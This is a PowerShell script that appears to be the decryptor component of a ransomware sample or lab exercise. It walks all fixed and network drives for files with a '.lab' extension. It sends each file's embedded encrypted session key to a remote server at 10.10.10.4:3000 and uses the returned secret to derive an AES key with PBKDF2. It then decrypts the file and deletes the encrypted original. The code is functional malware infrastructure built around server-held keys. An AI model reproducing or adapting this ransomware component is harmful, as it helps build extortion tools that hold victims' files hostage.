# decypt
function decrypt_web_request{
	param ($ensession,[String]$url)
	try {
	$b64 = [Convert]::ToBase64String($ensession)
	$postParams = @{ensession=$b64}
	$userAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
	$response = Invoke-WebRequest -UserAgent $userAgent -Uri $url -Method POST -Body $postParams -TimeoutSec 10 -UseBasicParsing
		if ([int]$response.StatusCode -ne 200){
		return 0
		}
		else{
		return $response.content
		}
	}
	catch{
		return 0
	}
}

function aes_decrypt_file{
#decrypt_file
param ([String]$enfile)
	try {
		$InputStream = New-Object IO.FileStream($enfile, [IO.FileMode]::Open, [IO.FileAccess]::Read)
		$OutputFile = $enfile -replace ".lab",""
		$OutputStream = New-Object IO.FileStream($OutputFile,[IO.FileMode]::Create, [IO.FileAccess]::Write)
		# Read the enfile,enssion and Salt
		$enfile_byte = New-Object Byte[]($InputStream.Length)
		$InputStream.Read($enfile_byte, 0, $InputStream.Length) | out-null
		$enSession = $enfile_byte[0..255]
		$Salt = $enfile_byte[256..287]
		# read file after Salt
		$InputStream.Seek(288,[System.IO.SeekOrigin]::Begin)| out-null
		# decrypt session
		$desession = decrypt_web_request -ensession $enSession -url "http://10.10.10.4:3000/session"
		# Generate PBKDF2 from Salt and Password
		$PBKDF2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($desession, $Salt)
		# Get our AES key, iv and hmac key from the PBKDF2 stream
		$AESKey  = $PBKDF2.GetBytes(32)
		$AESIV   = $PBKDF2.GetBytes(16)
		# Setup our decryptor
		$AES = New-Object Security.Cryptography.AesManaged
		$Dec = $AES.CreateDecryptor($AESKey, $AESIV)
		# decryptstream
		$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($InputStream, $Dec, [System.Security.Cryptography.CryptoStreamMode]::Read)
		$CryptoStream.CopyTo($OutputStream)
		# close cryptstream
		$InputStream.Close()
		$CryptoStream.Close()
		$OutputStream.Close()
		Remove-Item $enfile
	}
	catch {
	  $InputStream.Close()
	  $CryptoStream.Close()
	  $OutputStream.Close()
    } 

}

# decrypt all File 
$driverDir = @(($drivers = Gwmi Win32_LogicalDisk -filter "DriveType = 4").DeviceID,($drivers = Gwmi Win32_LogicalDisk -filter "DriveType = 3").DeviceID)
$enTargetlist = $driverDir | ForEach-Object {Get-ChildItem $_ -Recurse }|?{".lab" -contains $_.Extension}|ForEach-Object{ if ($_.FullName -notmatch "Windows|Program Files") {$_.FullName}}|sort -unique

$enTargetlist | ForEach-Object{aes_decrypt_file -enFile $_ -ErrorAction SilentlyContinue}


